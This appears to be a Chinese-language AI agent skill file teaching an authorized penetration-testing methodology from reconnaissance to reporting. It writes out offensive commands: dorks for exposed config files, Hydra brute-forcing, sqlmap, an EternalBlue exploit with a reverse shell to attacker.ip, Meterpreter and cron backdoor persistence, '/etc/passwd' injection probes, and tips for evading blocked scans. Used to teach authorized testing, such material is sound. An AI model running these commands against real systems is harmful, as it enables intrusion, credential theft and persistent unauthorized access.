---
name: ethical-hacking-methodology
description: "掌握从侦察到报告的完整渗透测试生命周期。本技能涵盖道德黑客方法论的五个阶段、必备工具、攻击技术以及授权安全评估的专业报告。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的渗透测试项目、防御性验证或受控教育环境。

# 道德黑客方法论

## 目的

掌握从侦察到报告的完整渗透测试生命周期。本技能涵盖道德黑客方法论的五个阶段、必备工具、攻击技术以及授权安全评估的专业报告。

## 前提条件

### 必需环境
- 已安装 Kali Linux（持久化或 Live 模式）
- 可访问授权目标的网络
- 系统所有者的书面授权

### 必备知识
- 基础网络概念
- Linux 命令行熟练度
- 理解 Web 技术
- 熟悉安全概念

## 输出与交付物

1. **侦察报告** - 收集的目标信息
2. **漏洞评估** - 识别的弱点
3. **漏洞利用证据** - 概念验证攻击
4. **最终报告** - 执行摘要和技术发现

## 核心工作流

### 阶段 1：理解黑客类型

安全专业人员分类：

**白帽黑客（道德黑客）**
- 授权的安全专业人员
- 经许可进行渗透测试
- 目标：识别并修复漏洞
- 也称为：渗透测试人员、安全顾问

**黑帽黑客（恶意黑客）**
- 未授权的系统入侵
- 动机：利益、报复或名声
- 目标：窃取数据、造成破坏
- 也称为：破解者、犯罪黑客

**灰帽黑客（混合型）**
- 可能跨越道德边界
- 非恶意但可能违反规则
- 通常公开披露漏洞
- 动机复杂

**其他分类**
- **脚本小子**：使用现成工具但不理解原理
- **黑客行动主义者**：政治或社会动机驱动
- **国家级黑客**：政府资助的操作人员
- **代码开发者**：开发工具和漏洞利用程序

### 阶段 2：侦察

在不直接与系统交互的情况下收集信息：

**被动侦察**
```bash
# WHOIS 查询
whois target.com

# DNS 枚举
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# 子域名发现
dnsrecon -d target.com

# 邮箱收集
theHarvester -d target.com -b all
```

**Google 黑客技术（OSINT）**
```
# 查找暴露的文件
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# 查找登录页面
site:target.com inurl:login
site:target.com inurl:admin

# 查找目录列表
site:target.com intitle:"index of"

# 查找配置文件
site:target.com filetype:config
site:target.com filetype:env
```

**Google 黑客数据库类别：**
- 包含密码的文件
- 敏感目录
- Web 服务器检测
- 易受攻击的服务器
- 错误消息
- 登录门户

**社交媒体侦察**
- LinkedIn：组织架构、使用的技术
- Twitter：公司公告、员工信息
- Facebook：个人信息、人际关系
- 招聘信息：技术栈泄露

### 阶段 3：扫描

对目标系统进行主动枚举：

**主机发现**
```bash
# Ping 扫描
nmap -sn 192.168.1.0/24

# ARP 扫描（本地网络）
arp-scan -l

# 发现存活主机
nmap -sP 192.168.1.0/24
```

**端口扫描**
```bash
# TCP SYN 扫描（隐蔽扫描）
nmap -sS target.com

# 完整 TCP 连接扫描
nmap -sT target.com

# UDP 扫描
nmap -sU target.com

# 全端口扫描
nmap -p- target.com

# 前 1000 端口加服务检测
nmap -sV target.com

# 激进扫描（操作系统、版本、脚本）
nmap -A target.com
```

**服务枚举**
```bash
# 特定服务脚本
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# 漏洞扫描
nmap --script=vuln target.com
```

**常用端口参考**
| 端口 | 服务 | 说明 |
|------|---------|-------|
| 21 | FTP | 文件传输 |
| 22 | SSH | 安全外壳 |
| 23 | Telnet | 非加密远程访问 |
| 25 | SMTP | 电子邮件 |
| 53 | DNS | 域名解析 |
| 80 | HTTP | Web 服务 |
| 443 | HTTPS | 安全 Web 服务 |
| 445 | SMB | Windows 共享 |
| 3306 | MySQL | 数据库 |
| 3389 | RDP | 远程桌面 |

### 阶段 4：漏洞分析

识别可利用的弱点：

**自动化扫描**
```bash
# Nikto Web 扫描器
nikto -h http://target.com

# OpenVAS（命令行）
omp -u admin -w password --xml="<get_tasks/>"

# Nessus（通过 API）
nessuscli scan --target target.com
```

**Web 应用测试（OWASP）**
- SQL 注入
- 跨站脚本（XSS）
- 身份认证失效
- 安全配置错误
- 敏感数据泄露
- XML 外部实体（XXE）
- 访问控制失效
- 不安全的反序列化
- 使用含有已知漏洞的组件
- 日志与监控不足

**手动技术**
```bash
# 目录暴力破解
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 子域名枚举
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web 技术指纹识别
whatweb target.com
```

### 阶段 5：漏洞利用

主动利用发现的漏洞：

**Metasploit 框架**
```bash
# 启动 Metasploit
msfconsole

# 搜索漏洞利用
msf> search type:exploit name:smb

# 使用特定漏洞利用
msf> use exploit/windows/smb/ms17_010_eternalblue

# 设置目标
msf> set RHOSTS target.com

# 设置载荷
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# 执行
msf> exploit
```

**密码攻击**
```bash
# Hydra 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web 漏洞利用**
```bash
# SQLMap 进行 SQL 注入
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS 测试
# 手动: <script>alert('XSS')</script>

# 命令注入测试
# ; ls -la
# | cat /etc/passwd
```

### 阶段 6：维持访问

建立持久化访问：

**后门**
```bash
# Meterpreter 持久化
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH 密钥持久化
# 将攻击者的公钥添加到 ~/.ssh/authorized_keys

# Cron 任务持久化
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**权限提升**
```bash
# Linux 枚举
linpeas.sh
linux-exploit-suggester.sh

# Windows 枚举
winpeas.exe
windows-exploit-suggester.py

# 检查 SUID 二进制文件（Linux）
find / -perm -4000 2>/dev/null

# 检查 sudo 权限
sudo -l
```

**清除痕迹（道德语境）**
- 记录所有执行的操作
- 保留日志用于报告
- 避免不必要的系统更改
- 清理测试文件和后门

### 阶段 7：报告

专业记录发现：

**报告结构**
1. **执行摘要**
   - 高层次发现
   - 业务影响
   - 风险评级
   - 修复优先级

2. **技术发现**
   - 漏洞详情
   - 概念验证
   - 截图/证据
   - 受影响系统

3. **风险评级**
   - 严重：需立即处理
   - 高：24-48 小时内处理
   - 中：1 周内处理
   - 低：1 个月内处理
   - 信息性：最佳实践建议

4. **修复建议**
   - 每项发现的具体修复方案
   - 短期缓解措施
   - 长期解决方案
   - 资源需求

5. **附录**
   - 详细扫描输出
   - 工具配置
   - 测试时间线
   - 范围和方法论

### 阶段 8：常见攻击类型

**网络钓鱼**
- 基于邮件的凭证窃取
- 伪造登录页面
- 恶意附件
- 社会工程学组件

**恶意软件类型**
- **病毒**：自我复制，需要宿主文件
- **蠕虫**：在网络中自我传播
- **木马**：伪装成合法软件
- **勒索软件**：加密文件索要赎金
- **Rootkit**：隐藏的系统级访问
- **间谍软件**：监控用户活动

**网络攻击**
- 中间人攻击（MITM）
- ARP 欺骗
- DNS 污染
- DDoS（分布式拒绝服务）

### 阶段 9：Kali Linux 安装

安装渗透测试平台：

**硬盘安装**
1. 从 kali.org 下载 ISO
2. 从安装介质启动
3. 选择"图形化安装"
4. 配置语言、位置、键盘
5. 设置主机名和 root 密码
6. 分区磁盘（引导 - 使用整个磁盘）
7. 安装 GRUB 引导加载程序
8. 重启并登录

**Live USB（持久化）**
```bash
# 创建可启动 USB
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# 创建持久化分区
gparted /dev/sdb
# 添加标记为"persistence"的 ext4 分区

# 配置持久化
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### 阶段 10：道德准则

**法律要求**
- 获取书面授权
- 明确定义范围
- 记录所有测试活动
- 向客户报告所有发现
- 保密

**职业操守**
- 诚信道德工作
- 尊重访问数据的隐私
- 避免不必要的系统损坏
- 仅执行计划的测试
- 绝不利用发现谋取私利

## 快速参考

### 渗透测试生命周期

| 阶段 | 目的 | 关键工具 |
|-------|---------|-----------|
| 侦察 | 收集信息 | theHarvester, WHOIS, Google |
| 扫描 | 枚举目标 | Nmap, Nikto, Gobuster |
| 漏洞利用 | 获取访问权限 | Metasploit, SQLMap, Hydra |
| 维持访问 | 持久化 | Meterpreter, SSH 密钥 |
| 报告 | 记录发现 | 报告模板 |

### 常用命令

| 命令 | 用途 |
|---------|---------|
| `nmap -sV target` | 端口和服务扫描 |
| `nikto -h target` | Web 漏洞扫描 |
| `msfconsole` | 启动 Metasploit |
| `hydra -l user -P list ssh://target` | SSH 暴力破解 |
| `sqlmap -u "url?id=1" --dbs` | SQL 注入 |

## 约束与限制

### 需要授权
- 未经书面许可不得测试
- 保持在定义的范围内
- 报告未授权访问尝试

### 专业标准
- 遵循交战规则
- 维护客户机密
- 记录使用的方法论
- 提供可操作的建议

## 故障排除

### 扫描被阻止

**解决方案：**
1. 使用较慢的扫描速率
2. 尝试不同的扫描技术
3. 使用代理或 VPN
4. 分片数据包

### 漏洞利用失败

**解决方案：**
1. 验证目标漏洞是否存在
2. 检查载荷兼容性
3. 调整漏洞利用参数
4. 尝试替代漏洞利用

## 使用时机
本技能适用于执行概述中描述的工作流或操作。
